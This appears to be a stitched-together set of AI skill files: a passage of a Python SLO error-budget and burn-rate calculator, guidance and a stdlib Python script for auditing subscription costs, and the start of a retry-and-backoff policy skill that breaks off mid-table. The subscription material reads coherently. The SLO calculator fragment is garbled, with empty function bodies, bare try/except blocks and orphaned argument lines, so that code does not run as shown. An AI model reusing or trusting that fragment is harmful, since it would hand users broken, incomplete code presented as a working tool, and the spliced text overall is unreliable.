        raise SLOError("SLO must be between 0 and 100 (exclusive), e.g. 99.9")
    budget = 1 - slo_pct / 100
    win = parse_duration(window)
    diffs = [(b[0] - a[0]).total_seconds() for a, b in zip(rows, rows[1:])]
    step = statistics.median(diffs)
    if step <= 0:
        raise SLOError("duplicate timestamps")
    first = rows[0][0]
    end = (now or rows[-1][0] + dt.timedelta(seconds=step))
    covered = (end - first).total_seconds()
    expected_rows = int(round(covered / step))
    missing = max(0, expected_rows - len(rows))

    def window_stats(seconds):
        seconds = max(seconds, step)
        if seconds > covered + 1e-6:
            return None
        start = end - dt.timedelta(seconds=seconds)
        tot = sum(t for ts, t, b in rows if start <= ts < end)
        bad = sum(b for ts, t, b in rows if start <= ts < end)
        rate = bad / tot if tot else 0.0
        return {"seconds": seconds, "total": tot, "bad": bad, "error_rate": rate, "burn_rate": rate / budget}

    total = sum(r[1] for r in rows)
    bad = sum(r[2] for r in rows)
    req_per_sec = total / covered
    expected_window_total = req_per_sec * win
    allowed_bad = budget * expected_window_total
    consumed = bad / allowed_bad if allowed_bad else 0.0
    alerts = []
    for sev, lw, sw, share in policy:
        thr = share * win / parse_duration(lw)
        L, S = window_stats(parse_duration(lw)), window_stats(parse_duration(sw))
        if L is None or S is None:
            alerts.append({"severity": sev, "long": lw, "short": sw, "threshold": thr, "status": "not evaluable",
                           "long_burn": None, "short_burn": None})
            continue
        fires = L["burn_rate"] >= thr and S["burn_rate"] >= thr
        alerts.append({"severity": sev, "long": lw, "short": sw, "threshold": thr,
                       "status": "FIRING" if fires else "ok",
                       "long_burn": L["burn_rate"], "short_burn": S["burn_rate"]})
    burn = {}
    for w in ("5m", "30m", "1h", "2h", "6h", "1d", "3d"):
        s = window_stats(parse_duration(w))
        burn[w] = None if s is None else s["burn_rate"]
    remaining_bad = allowed_bad - bad
    exhaust = {}
    for w in ("1h", "6h", "1d"):
        s = window_stats(parse_duration(w))
        if s and s["bad"] > 0 and remaining_bad > 0:
            exhaust[w] = remaining_bad / (s["bad"] / s["seconds"])
        elif s:
            exhaust[w] = 0.0 if remaining_bad <= 0 else None
    worst = max(rows, key=lambda r: (r[2] / r[1] if r[1] else 0, r[0]))
    return {
        "slo_percent": slo_pct, "window": window, "window_seconds": win, "step_seconds": step,
        "data_start": first.strftime("%Y-%m-%dT%H:%M:%SZ"), "data_end": end.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "rows": len(rows), "missing_intervals": missing,
        "total": total, "bad": bad, "sli_percent": 100 * (1 - bad / total) if total else 100.0,
        "allowed_bad_in_window": allowed_bad, "budget_consumed": consumed, "budget_remaining": 1 - consumed,
        "allowed_downtime_seconds": budget * win,
        "burn_rates": burn, "alerts": alerts, "exhaustion_seconds": exhaust,
        "worst_interval": {"start": worst[0].strftime("%Y-%m-%dT%H:%M:%SZ"), "total": worst[1], "bad": worst[2],
                           "error_rate": worst[2] / worst[1] if worst[1] else 0.0},
    }


def allowance_table(slo_pct, window):
    win = parse_duration(window)
    b = 1 - slo_pct / 100
    return {"slo_percent": slo_pct, "window": window, "allowed_downtime_seconds": b * win,
            "per_day_seconds": b * 86400, "per_week_seconds": b * 604800,
            "thresholds": [{"severity": s, "long": l, "short": sh, "share": sha, "burn_rate": sha * win / parse_duration(l)}
                           for s, l, sh, sha in POLICY]}


def to_markdown(r):
    pct = lambda x: f"{100 * x:.1f}%"
    out = [f"# SLO error budget report", "",
           f"**SLO:** {r['slo_percent']}% over {r['window']}  **Data:** {r['data_start']} to {r['data_end']} "
           f"({r['rows']} rows, step {fmt_dur(r['step_seconds'])}, {r['missing_intervals']} missing)",
           f"**SLI over data:** {r['sli_percent']:.4f}%  ({r['bad']:,} bad of {r['total']:,})",
           f"**Error budget:** {r['allowed_bad_in_window']:,.0f} bad requests per {r['window']} at current traffic "
           f"(= {fmt_dur(r['allowed_downtime_seconds'])} of full downtime)",
           f"**Consumed so far:** {pct(r['budget_consumed'])}  **Remaining:** {pct(r['budget_remaining'])}", "",
           "## Burn rates (1.0 = on budget)", "", "| Window | Burn rate |", "|---|---|"]
    for w, v in r["burn_rates"].items():
        out.append(f"| {w} | {'n/a' if v is None else f'{v:.2f}'} |")
    out += ["", "## Alert policy", "", "| Severity | Long / short window | Threshold | Long burn | Short burn | Status |",
            "|---|---|---|---|---|---|"]
    for a in r["alerts"]:
        lb = "n/a" if a["long_burn"] is None else f"{a['long_burn']:.2f}"
        sb = "n/a" if a["short_burn"] is None else f"{a['short_burn']:.2f}"
        out.append(f"| {a['severity']} | {a['long']} / {a['short']} | {a['threshold']:.1f} | {lb} | {sb} | {a['status']} |")
    out += ["", "## Time to exhaustion at recent burn"]
    for w, s in r["exhaustion_seconds"].items():
        out.append(f"- at last {w} rate: " + ("budget already exhausted" if s == 0 else ("no errors in window" if s is None else fmt_dur(s))))
    wi = r["worst_interval"]
    out += ["", f"Worst interval: {wi['start']} with {wi['bad']:,} bad of {wi['total']:,} ({100 * wi['error_rate']:.2f}%)"]
    return "\n".join(out)


def self_test():
    cases = []

    def ok(name, cond):

    ok("duration format", fmt_dur(43.2 * 60) == "43m 12s" and fmt_dur(86400 * 3) == "3d")
    a = allowance_table(99.9, "30d")

    ok("page threshold 14.4 for 30d", abs(a["thresholds"][0]["burn_rate"] - 14.4) < 1e-9)
    ok("28d threshold scales to 13.44", abs(allowance_table(99.9, "28d")["thresholds"][0]["burn_rate"] - 13.44) < 1e-9)
    flat = series(4 * 24 * 4, 15, 10000, lambda i: 10)          # 0.1% errors at 99.9 -> burn 1.0
    r = analyze(flat, 99.9, "30d")
    ok("steady burn rate is 1.0", abs(r["burn_rates"]["1h"] - 1.0) < 1e-9 and abs(r["burn_rates"]["1d"] - 1.0) < 1e-9)
    ok("no alert at burn 1.0", all(x["status"] != "FIRING" for x in r["alerts"][:3]))
    ok("burn 1.0 over 4 of 30 days consumes 4/30", abs(r["budget_consumed"] - 4 / 30) < 1e-9)
    ok("SLI computed", abs(r["sli_percent"] - 99.9) < 1e-9)
    spike = series(4 * 24 * 4, 15, 10000, lambda i: 200 if i >= 4 * 24 * 4 - 4 else 5)   # last hour 2% errors
    r = analyze(spike, 99.9, "30d")
    ok("fast burn pages (1h/5m)", r["alerts"][0]["status"] == "FIRING")
    ok("short window rounded up to step", abs(r["burn_rates"]["5m"] - 20.0) < 1e-9)
    ok("6h page not firing for 1h spike", r["alerts"][1]["status"] == "ok")
    recovered = spike[:-2] + [(spike[-2][0], 10000, 5), (spike[-1][0], 10000, 5)]

                        (["ts,total,bad", "nope,10,1", "2026-01-01T00:05:00Z,10,0"], "bad timestamp rejected")]:
        try:

        except SLOError:

    try:

    ok("markdown has alert table", "## Alert policy" in to_markdown(analyze(flat, 99.9, "30d")))

def main(argv=None):
    ap = argparse.ArgumentParser(description="Compute SLO error budget consumption and multiwindow burn-rate alerts.")

    ap.add_argument("--slo", type=float, default=99.9, help="target in percent (default 99.9)")
    ap.add_argument("--window", default="30d", help="SLO window, e.g. 28d or 30d (default 30d)")

                      f"({fmt_dur(t['per_day_seconds'])}/day, {fmt_dur(t['per_week_seconds'])}/week)")
                for x in t["thresholds"]:
                    print(f"  {x['severity']:6} {x['share'] * 100:.0f}% of budget in {x['long']} (short {x['short']}): burn rate >= {x['burn_rate']:.2f}")

        lines = sys.stdin.read().splitlines() if a.file == "-" else open(a.file, encoding="utf-8").read().splitlines()

    return 1 if paging or r["budget_remaining"] <= 0 else 0

    sys.exit(main())

You help people see what their subscriptions really cost and decide what to keep. You turn bank statement lines, app store receipts, or a rough list into one table, convert every charge to the same currency and to monthly and yearly amounts, and point out the easy wins: services nobody uses, three video services where one would do, trials about to turn into paid plans, quiet price increases, and annual plans that are cheaper if the service is kept anyway. Helpful: currency, next_renewal, category, last_used (an honest guess is fine), users (people sharing the plan), trial_end and paid_after_trial, previous_amount, annual_price.

# Cost Normalization

## Charges per month by cycle
| Cycle | Charges per month | Yearly cost of 10.00 |
|---|---|---|
| weekly | 4.348125 (365.25 / 12 / 7) | 521.78 |
| biweekly | 2.1740625 | 260.89 |
| monthly | 1 | 120.00 |
| quarterly | 1/3 | 40.00 |
| semiannual | 1/6 | 20.00 |
| yearly | 1/12 | 10.00 |
| every N days | 30.436875 / N | |

monthly cost = charge x rate x charges per month; yearly cost = monthly x 12. Rounding to cents happens only at the end, so totals do not drift.

## Currencies
- Use one report currency and one rate per foreign currency, e.g. `--rate USD=0.92` (1 USD = 0.92 EUR).
- Best source: the converted amount on the card statement divided by the original amount. It includes the card's FX margin.
- Mention foreign transaction fees separately if the card charges them (often 1-3%).

## Shared plans
- `users` = number of people sharing. Your share = cost / users.
- Show both the full cost (what the card pays) and your share (what you would pay after others pay you back). If others do not actually pay, use users = 1.

## Trials
- A trial has amount 0, `trial_end`, and `paid_after_trial`. Charges on or after `trial_end` use the paid amount in the upcoming-charges list.
- Totals show today's cost (0) so the user sees what changes if they do nothing: the TRIAL flag gives the converted monthly and yearly price.

## Price changes
- `previous_amount` = the price before the latest increase. Yearly impact = (new - old) x rate x charges per month x 12.
- Providers often announce increases by email 30 days ahead; search for "price change" and "new price".

## Annual vs monthly
- Annual saves money only if the service would be kept for 12 months anyway. Saving = monthly cost x 12 - annual price.
- Annual plans are usually not refundable after a short window; switch only for services used every week.

## Renewal dates
- `next_renewal` in the past is rolled forward by the cycle until it is today or later.
- Month-end dates clamp: a plan renewing on the 31st renews on Feb 28 (or 29) and then on the 28th or 31st depending on the provider; check the receipt.

# Cancellation and Downgrade Playbook

## Where to cancel
| Billed through | Where to cancel |
|---|---|
| Apple App Store | Settings > your name > Subscriptions |
| Google Play | Play Store > profile > Payments & subscriptions > Subscriptions |
| PayPal | Settings > Payments > Manage automatic payments (stops payments, also cancel with the provider) |
| Directly with the service | Account or billing page on the website; some require a chat or phone call |
| Mobile carrier or TV bundle | Carrier account or support line |

Deleting an app does not cancel its subscription.

## Steps
1. Check the renewal date and whether cancelling ends access now or at the end of the period (usually the end).
2. Export anything you want to keep (photos, playlists, notes, workout history).
3. Cancel through the official channel above, not through links in unexpected emails.
4. Save proof: confirmation email or screenshot with date.
5. Watch the next statement; dispute a charge after cancellation with the provider first, then the card issuer.

## Alternatives to cancelling
- **Pause** (gyms, meal kits, some streaming services) for travel or busy months.
- **Downgrade** to an ad-supported, single-screen, or smaller storage tier.
- **Rotate** streaming: keep one service at a time and switch monthly for the shows you want.
- **Share** a family plan with your household, within the provider's terms.
- **Ask** for a retention offer: many services offer a discount when you start cancelling. Decide your walk-away price first.

## Trials
- Set a reminder 2-3 days before `trial_end`; many trials can be cancelled right after signing up while keeping the trial period.
- Use a virtual card with a limit or a single-merchant card for trials if the bank offers it.

## Message template (support chat or email)
> Hello, please cancel my <service> subscription on the account <email> effective at the end of the current billing period, and confirm by email that no further charges will be made. Thank you.

## Habits that keep costs down
- Review subscriptions every quarter with this skill.
- Keep one calendar with all yearly renewal dates.
- Before subscribing, ask: will I use it at least weekly?

#!/usr/bin/env python3
"""Subscription spending auditor (Python 3 standard library only).

Input CSV columns (header names are case-insensitive; only name, amount, cycle are required):
  name, amount, currency, cycle, next_renewal, category, last_used, users, trial_end,
  previous_amount, annual_price, paid_after_trial
cycle: weekly, biweekly, monthly, quarterly, semiannual, yearly/annual, or "every N days|weeks|months|years"
       (also short forms like 2w, 3m, 1y).
users: how many people share the plan; your share = amount / users (default 1).
trial_end + paid_after_trial: a free trial (amount 0) that converts to paid_after_trial on trial_end.

Reports, all converted to one currency with explicit rates (--rate USD=0.92):
  monthly and yearly cost per item and in total, by category, your share of shared plans,
  renewals in the next --days days (past dates are rolled forward by the cycle),
  flags: UNUSED (last_used older than --unused-days), OVERLAP (several items in one category),
  TRIAL (trial ends within --days; amount after trial if given), PRICE_UP (amount > previous_amount),
  ANNUAL_SAVES (annual_price cheaper than 12 x monthly), RENEWS_YEARLY (a yearly charge within --days).
Usage:
  python3 sub_audit.py subscriptions.csv --currency EUR --rate USD=0.92 --today 2026-10-20
  python3 sub_audit.py subscriptions.csv --json
  python3 sub_audit.py --self-test
Exit code: 0 OK, 2 bad input.
"""
import argparse
import calendar
import csv
import datetime as dt
import json
import re
import sys
from decimal import Decimal, ROUND_HALF_UP

NAMED = {"weekly": (1, "w"), "biweekly": (2, "w"), "fortnightly": (2, "w"), "monthly": (1, "m"),
         "bimonthly": (2, "m"), "quarterly": (3, "m"), "semiannual": (6, "m"), "semiannually": (6, "m"),
         "half-yearly": (6, "m"), "yearly": (12, "m"), "annual": (12, "m"), "annually": (12, "m")}
UNIT = {"d": "d", "day": "d", "days": "d", "w": "w", "week": "w", "weeks": "w", "m": "m", "month": "m",
        "months": "m", "y": "y", "year": "y", "years": "y"}
PER_MONTH = {"d": Decimal("30.436875"), "w": Decimal("4.348125"), "m": Decimal(1), "y": Decimal(1) / 12}
D2 = Decimal("0.01")


class AuditError(ValueError):
    pass


def parse_cycle(s):
    s = (s or "").strip().lower()
    if s in NAMED:
        n, u = NAMED[s]
        return n, u
    m = re.fullmatch(r"(?:every\s+)?(\d+)\s*([a-z]+)", s)
    if m and m.group(2) in UNIT:
        n, u = int(m.group(1)), UNIT[m.group(2)]
        if n <= 0:
            raise AuditError(f"cycle must be positive: {s!r}")
        if u == "y":
            return n * 12, "m"
        return n, u
    raise AuditError(f"unknown cycle {s!r} (use weekly, monthly, quarterly, yearly or 'every 2 months')")


def monthly_factor(n, u):
    """How many charges per month for a cycle of n units."""
    return PER_MONTH[u] / n


def add_cycle(d, n, u):
    if u == "d":
        return d + dt.timedelta(days=n)
    if u == "w":
        return d + dt.timedelta(weeks=n)
    m = d.month - 1 + n
    y, m = d.year + m // 12, m % 12 + 1
    return dt.date(y, m, min(d.day, calendar.monthrange(y, m)[1]))


def parse_date(s, field, name):
    s = (s or "").strip()
    if not s:
        return None
    try:
        return dt.date.fromisoformat(s)
    except ValueError:
        raise AuditError(f"{name}: bad {field} date {s!r} (use YYYY-MM-DD)")


def money(s, field, name, required=False):
    s = (s or "").strip().replace(",", "") if (s or "").count(",") and "." in (s or "") else (s or "").strip().replace(",", ".")
    if not s:
        if required:
            raise AuditError(f"{name}: {field} is required")
        return None
    try:
        v = Decimal(s)
    except Exception:
        raise AuditError(f"{name}: bad {field} {s!r}")
    if v < 0:
        raise AuditError(f"{name}: {field} cannot be negative")
    return v


def q(v):
    return v.quantize(D2, rounding=ROUND_HALF_UP)


def load(lines):
    rd = csv.DictReader(lines)
    if not rd.fieldnames:
        raise AuditError("empty CSV")
    rows = []
    for r in rd:
        r = {(k or "").strip().lower(): (v or "").strip() for k, v in r.items()}
        if not any(r.values()):
            continue
        if not r.get("name"):
            raise AuditError("every row needs a name")
        rows.append(r)
    if not rows:
        raise AuditError("no subscriptions found")
    return rows


def audit(rows, currency="EUR", rates=None, today=None, days=30, unused_days=45):
    rates = {k.upper(): Decimal(str(v)) for k, v in (rates or {}).items()}
    rates[currency.upper()] = Decimal(1)
    today = today or dt.date.today()
    horizon = today + dt.timedelta(days=days)
    items, flags, renewals, raw = [], [], [], {}
    for r in rows:
        name = r["name"]
        cur = (r.get("currency") or currency).upper()
        if cur not in rates:
            raise AuditError(f"{name}: no rate for {cur}; pass --rate {cur}=<value in {currency}>")
        rate = rates[cur]
        n, u = parse_cycle(r.get("cycle"))
        amount = money(r.get("amount"), "amount", name, required=True)
        after_trial = money(r.get("paid_after_trial"), "paid_after_trial", name)
        trial_end = parse_date(r.get("trial_end"), "trial_end", name)
        users = int(r.get("users") or 1)
        if users < 1:
            raise AuditError(f"{name}: users must be at least 1")
        charge = amount * rate
        f = monthly_factor(n, u)
        monthly = charge * f
        item = {"name": name, "category": r.get("category") or "Other", "currency": cur, "amount": float(amount),
                "cycle": r.get("cycle"), "monthly": q(monthly), "yearly": q(monthly * 12), "users": users,
                "your_monthly": q(monthly / users), "your_yearly": q(monthly * 12 / users)}
        raw[name] = (monthly, monthly / users)
        items.append(item)
        nxt = parse_date(r.get("next_renewal"), "next_renewal", name)
        if nxt:
            while nxt < today:
                nxt = add_cycle(nxt, n, u)
            item["next_renewal"] = nxt.isoformat()
            d = nxt
            while d <= horizon:
                due = charge
                if trial_end and d >= trial_end and after_trial is not None:
                    due = after_trial * rate
                renewals.append({"date": d.isoformat(), "name": name, "amount": q(due)})
                d = add_cycle(d, n, u)
            if (n, u) in ((12, "m"),) or (u == "m" and n >= 12):
                if nxt <= horizon:
                    flags.append({"name": name, "flag": "RENEWS_YEARLY",
                                  "detail": f"{q(charge)} {currency} charge on {nxt.isoformat()}; decide before then"})
        last = parse_date(r.get("last_used"), "last_used", name)
        if last and (today - last).days > unused_days:
            flags.append({"name": name, "flag": "UNUSED",
                          "detail": f"last used {last.isoformat()} ({(today - last).days} days ago); costs {q(monthly * 12)} {currency}/year"})
        if trial_end and today <= trial_end <= horizon:
            extra = (f"; then {q(after_trial * rate)} {currency} per charge ({q(after_trial * rate * f * 12)} {currency}/year)"
                     if after_trial is not None else "")
            flags.append({"name": name, "flag": "TRIAL",
                          "detail": f"trial ends {trial_end.isoformat()} ({(trial_end - today).days} days){extra}; cancel or keep on purpose"})
        prev = money(r.get("previous_amount"), "previous_amount", name)
        if prev and amount > prev:
            pct = (amount - prev) / prev * 100
            flags.append({"name": name, "flag": "PRICE_UP",
                          "detail": f"{prev} -> {amount} {cur} (+{q(pct)}%), +{q((amount - prev) * rate * f * 12)} {currency}/year"})
        annual = money(r.get("annual_price"), "annual_price", name)
        if annual is not None and not (u == "m" and n == 12):
            save = monthly * 12 - annual * rate
            if save > 0:
                flags.append({"name": name, "flag": "ANNUAL_SAVES",
                              "detail": f"annual plan {q(annual * rate)} {currency} vs {q(monthly * 12)} {currency} paid {r.get('cycle')}: saves {q(save)} {currency}/year if you keep it 12 months"})
    cats = {}
    for it in items:
        c = cats.setdefault(it["category"], {"count": 0, "monthly": Decimal(0), "names": []})
        c["count"] += 1
        c["monthly"] += raw[it["name"]][0]
        c["names"].append(it["name"])
    for cname, c in sorted(cats.items()):
        if c["count"] > 1:
            flags.append({"name": ", ".join(c["names"]), "flag": "OVERLAP",
                          "detail": f"{c['count']} subscriptions in {cname} ({q(c['monthly'])} {currency}/month); keep the one you use most"})
    order = {"TRIAL": 0, "RENEWS_YEARLY": 1, "UNUSED": 2, "OVERLAP": 3, "PRICE_UP": 4, "ANNUAL_SAVES": 5}
    flags.sort(key=lambda x: (order[x["flag"]], x["name"]))
    renewals.sort(key=lambda x: (x["date"], x["name"]))
    unused_names = {f["name"] for f in flags if f["flag"] == "UNUSED"}
    total_m = sum((raw[it["name"]][0] for it in items), Decimal(0))
    your_m = sum((raw[it["name"]][1] for it in items), Decimal(0))
    return {
        "currency": currency, "today": today.isoformat(), "days": days, "rates": {k: str(v) for k, v in rates.items()},
        "count": len(items), "monthly_total": q(total_m), "yearly_total": q(total_m * 12),
        "your_monthly_total": q(your_m), "your_yearly_total": q(your_m * 12),
        "unused_yearly": q(sum((raw[it["name"]][0] * 12 for it in items if it["name"] in unused_names), Decimal(0))),
        "next_days_total": q(sum((x["amount"] for x in renewals), Decimal(0))),
        "by_category": {k: {"count": v["count"], "monthly": q(v["monthly"])} for k, v in sorted(cats.items(), key=lambda kv: -kv[1]["monthly"])},
        "items": sorted(items, key=lambda it: -it["monthly"]), "renewals": renewals, "flags": flags,
    }


def to_markdown(r):
    c = r["currency"]
    out = ["# Subscription audit", "",
           f"**As of:** {r['today']}  **Subscriptions:** {r['count']}  **Currency:** {c}  **Rates:** "
           + ", ".join(f"1 {k} = {v} {c}" for k, v in r["rates"].items() if k != c.upper()),
           f"**Total:** {r['monthly_total']} {c}/month = {r['yearly_total']} {c}/year  "
           f"**Your share:** {r['your_monthly_total']} {c}/month = {r['your_yearly_total']} {c}/year",
           f"**Unused (yearly cost):** {r['unused_yearly']} {c}  **Charges in next {r['days']} days:** {r['next_days_total']} {c}",
           "", "## Action list", ""]
    out += [f"- **{f['flag']}** {f['name']}: {f['detail']}" for f in r["flags"]] or ["- Nothing to act on."]
    out += ["", "## All subscriptions (most expensive first)", "",
            "| Name | Category | Charge | Cycle | Per month | Per year | Users | Your year | Next renewal |",
            "|---|---|---|---|---|---|---|---|---|"]
    for it in r["items"]:
        out.append(f"| {it['name']} | {it['category']} | {it['amount']:.2f} {it['currency']} | {it['cycle']} | {it['monthly']} | "
                   f"{it['yearly']} | {it['users']} | {it['your_yearly']} | {it.get('next_renewal', '')} |")
    out += ["", "## By category", "", "| Category | Count | Per month |", "|---|---|---|"]
    out += [f"| {k} | {v['count']} | {v['monthly']} |" for k, v in r["by_category"].items()]
    out += ["", f"## Charges in the next {r['days']} days", ""]
    out += [f"- {x['date']} {x['name']}: {x['amount']} {c}" for x in r["renewals"]] or ["- none"]
    return "\n".join(out)


def self_test():
    cases = []

    def ok(name, cond):
        cases.append((name, bool(cond)))

    T = dt.date(2026, 10, 20)
    hdr = "name,amount,currency,cycle,next_renewal,category,last_used,users,trial_end,previous_amount,annual_price,paid_after_trial"

    def run(*lines, **kw):
        return audit(load([hdr, *lines]), today=T, **kw)

    ok("named cycles", parse_cycle("Quarterly") == (3, "m") and parse_cycle("annual") == (12, "m"))
    ok("every N units", parse_cycle("every 2 weeks") == (2, "w") and parse_cycle("1y") == (12, "m"))
    ok("month end clamps", add_cycle(dt.date(2026, 1, 31), 1, "m") == dt.date(2026, 2, 28))
    ok("leap year clamp", add_cycle(dt.date(2027, 2, 28), 12, "m") == dt.date(2028, 2, 28) and add_cycle(dt.date(2028, 1, 31), 1, "m") == dt.date(2028, 2, 29))
    r = run("A,10,EUR,monthly,,X,,,,,,")
    ok("monthly 10 = 120/year", r["yearly_total"] == Decimal("120.00"))
    r = run("A,120,EUR,yearly,,X,,,,,,")
    ok("yearly 120 = 10/month", r["monthly_total"] == Decimal("10.00"))
    r = run("A,5,EUR,weekly,,X,,,,,,")
    ok("weekly 5 = 260.89/year", r["yearly_total"] == Decimal("260.89") and r["items"][0]["monthly"] == Decimal("21.74"))
    r = run("A,1,EUR,monthly,,X,,3,,,,", "B,1,EUR,monthly,,X,,3,,,,", "C,1,EUR,monthly,,X,,3,,,,")
    ok("totals use unrounded shares", r["your_monthly_total"] == Decimal("1.00"))
    r = run("A,10,USD,monthly,,X,,,,,,", rates={"USD": "0.9"})
    ok("currency rate applied", r["monthly_total"] == Decimal("9.00"))
    try:
        run("A,10,GBP,monthly,,X,,,,,,")
        ok("missing rate rejected", False)
    except AuditError:
        ok("missing rate rejected", True)
    r = run("Fam,20,EUR,monthly,,Music,,4,,,,")
    ok("shared plan your share", r["your_monthly_total"] == Decimal("5.00") and r["monthly_total"] == Decimal("20.00"))
    r = run("Old,10,EUR,monthly,,X,2026-07-01,,,,,")
    ok("unused flagged", any(f["flag"] == "UNUSED" for f in r["flags"]) and r["unused_yearly"] == Decimal("120.00"))
    r = run("Fresh,10,EUR,monthly,,X,2026-10-01,,,,,")
    ok("recent use not flagged", not r["flags"])
    r = run("A,10,EUR,monthly,,Video,,,,,,", "B,8,EUR,monthly,,Video,,,,,,")
    ok("overlap flagged", [f["flag"] for f in r["flags"]] == ["OVERLAP"])
    r = run("T,0,EUR,monthly,2026-10-25,Software,,,2026-10-25,,,24.99")
    ok("trial flagged with paid price", r["flags"][0]["flag"] == "TRIAL" and "24.99" in r["flags"][0]["detail"])
    ok("trial charge counted in renewals", r["renewals"][0]["amount"] == Decimal("24.99"))
    r = run("P,12,EUR,monthly,,X,,,,10,,")
    ok("price increase flagged", r["flags"][0]["flag"] == "PRICE_UP" and "+20.00%" in r["flags"][0]["detail"] and "+24.00" in r["flags"][0]["detail"])
    r = run("M,10,EUR,monthly,,X,,,,,99,")
    ok("annual saving flagged", r["flags"][0]["flag"] == "ANNUAL_SAVES" and "saves 21.00" in r["flags"][0]["detail"])
    r = run("M,10,EUR,monthly,,X,,,,,130,")
    ok("no saving when annual is pricier", not r["flags"])
    r = run("Y,50,EUR,yearly,2026-11-01,X,,,,,,")
    ok("yearly renewal soon flagged", r["flags"][0]["flag"] == "RENEWS_YEARLY")
    r = run("W,1,EUR,weekly,2026-10-21,X,,,,,,")
    ok("weekly renewals listed in window", len(r["renewals"]) == 5 and r["next_days_total"] == Decimal("5.00"))
    r = run("Past,10,EUR,monthly,2026-08-15,X,,,,,,")
    ok("rolled forward to the future", r["items"][0]["next_renewal"] == "2026-11-15")
    for line, label in [("A,-3,EUR,monthly,,X,,,,,,", "negative amount rejected"),
                        ("A,3,EUR,sometimes,,X,,,,,,", "unknown cycle rejected"),
                        ("A,3,EUR,monthly,20-10-2026,X,,,,,,", "bad date rejected"),
                        ("A,3,EUR,monthly,,X,,0,,,,", "zero users rejected")]:
        try:
            run(line)
            ok(label, False)
        except AuditError:
            ok(label, True)
    ok("markdown has action list", "## Action list" in to_markdown(run("A,10,EUR,monthly,,X,,,,,,")))
    passed = sum(c for _, c in cases)
    for name, c in cases:
        print(("PASS " if c else "FAIL ") + name)
    print(f"{passed}/{len(cases)} passed")
    return 0 if passed == len(cases) else 1


def default(o):
    if isinstance(o, Decimal):
        return float(o)
    raise TypeError(type(o))


def main(argv=None):
    ap = argparse.ArgumentParser(description="Audit recurring subscriptions: true yearly cost, unused, overlapping, trials and renewals.")
    ap.add_argument("file", nargs="?", help="subscriptions CSV ('-' for stdin)")
    ap.add_argument("--currency", default="EUR", help="report currency (default EUR)")
    ap.add_argument("--rate", action="append", default=[], metavar="CUR=VALUE",
                    help="1 CUR = VALUE report-currency units, e.g. USD=0.92 (repeatable)")
    ap.add_argument("--today", help="evaluation date YYYY-MM-DD (default: today)")
    ap.add_argument("--days", type=int, default=30, help="look-ahead for renewals and trials (default 30)")
    ap.add_argument("--unused-days", type=int, default=45, help="flag items not used for this many days (default 45)")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--self-test", action="store_true")
    a = ap.parse_args(argv)
    if a.self_test:
        return self_test()
    if not a.file:
        ap.error("subscriptions CSV required (or --self-test)")
    try:
        rates = {}
        for x in a.rate:
            k, _, v = x.partition("=")
            if not v:
                raise AuditError(f"bad --rate {x!r}, use CUR=VALUE")
            rates[k.strip().upper()] = Decimal(v.strip())
        lines = sys.stdin.read().splitlines() if a.file == "-" else open(a.file, encoding="utf-8").read().splitlines()
        today = dt.date.fromisoformat(a.today) if a.today else None
        r = audit(load(lines), a.currency.upper(), rates, today, a.days, a.unused_days)
    except (OSError, AuditError, ValueError) as e:
        print(f"error: {e}", file=sys.stderr)
        return 2
    print(json.dumps(r, indent=2, default=default, ensure_ascii=False) if a.json else to_markdown(r))
    return 0


if __name__ == "__main__":
    sys.exit(main())

--- name: retry-backoff-policy-calculator description: Checks retry, backoff and timeout settings across a call chain to prevent retry storms. Computes exponential delay schedules with full, equal or decorrelated jitter, worst-case latency per layer, expected tries and request amplification. Flags inner timeouts that outlive the caller, retries of non-idempotent calls, retries on 4xx, ignored Retry-After and missing caps or deadlines. Includes a stdlib Python calculator with --self-test. --- # Retry and Backoff Policy Calculator You help engineers set retry, backoff and timeout policies that make services more reliable instead of turning a small outage into a big one. You collect the settings of every hop in a call chain (browser, gateway, services, databases, third-party APIs), compute what they really do under failure, and propose a safer policy with numbers. ## Files in this skill - `scripts/retry_policy.py` - reads a call-chain JSON and prints delay schedules, worst-case latency, expected tries, amplification and flags (Python 3 standard library only) - `references/backoff-math.md` - formulas for backoff, jitter, worst-case time, expected tries, amplification and timeout nesting - `references/retry-safety-guide.md` - what is safe to retry, idempotency keys, circuit breakers, retry budgets, common library settings - `templates/retry-policy-review.md` - review report with current chain, findings and proposed policy - `examples/checkout-chain.json` - a three-layer checkout chain with typical mistakes ## Workflow ### 1. Map the chain Ask for each hop, outermost first: attempts (total tries), base delay, multiplier, max delay, jitter type, per-try timeout, overall deadline, what it retries on (status codes, "timeout", "network"), whether the call is idempotent, whether an idempotency key is sent, and whether Retry-After is honored. Read them from code or config (SDK clients, HTTP client retry adapters, Envoy/Istio routes, gRPC service config, job queues). Unknown values: use the library default and mark them as assumed. ### 2. Run the calculator ``` python3 scripts/retry_policy.py examples/checkout-chain.json python3 scripts/retry_policy.py chain.json --failure-rate 0.5 --max-amplification 8 python3 scripts/retry_policy.py chain.json --json > retry-report.json python3 scripts/retry_policy.py --self-test ``` Exit code 1 means high-severity findings, 2 means bad input. ### 3. Explain the findings Order: RETRY_UNSAFE and AMPLIFICATION first (they cause duplicate side effects and outages), then INNER_OUTLIVES_CALLER, HOT_LOOP, NO_PER_TRY_TIMEOUT, then medium and low. Explain each with the numbers from the report, for example "one checkout can become 36 calls to the payments provider". ### 4. Propose a fixed policy Use `references/backoff-math.md` and `references/retry-safety-guide.md`: retry at one layer, full jitter with a cap, inner worst case below the caller's per-try timeout, deadlines passed down, idempotency keys for writes, no retries on 4xx except 408/429, Retry-After honored, a retry budget or circuit breaker. Re-run the script on the proposed JSON and show before and after. ### 5. Write it up Fill `templates/retry-policy-review.md` and give config snippets for the user's library. ## Example result For `examples/checkout-chain.json` at 30% failure rate: worst-case amplification 36 calls per checkout (expected 2.74); the gateway layer's 9.3 s worst case outlives the web app's 8 s per-try timeout; the payments layer retries a non-idempotent charge 4 times without an idempotency key and retries 409; no jitter at the gateway; Retry-After ignored on 429/503. ## Rules - Never recommend retrying a non-idempotent call without an idempotency key. - Keep numbers honest: label library defaults and guesses as assumptions. - Prefer fewer retries with good timeouts over many retries. - Recommend load tests or fault injection to confirm the policy, not just the math. FILE:references/backoff-math.md # Backoff and Timeout Math ## Terms - **attempts**: total tries including the first. attempts 3 = 1 try + 2 retries. - **base**: first retry delay. **multiplier**: growth factor (usually 2). **cap**: max single delay. - **per-try timeout**: how long one try may take before it is abandoned. - **deadline**: total time budget for the call including all tries and delays. ## Delay before retry k (k = 1 .. attempts-1) d(k) = min(cap, base x multiplier^(k-1)) | Jitter | 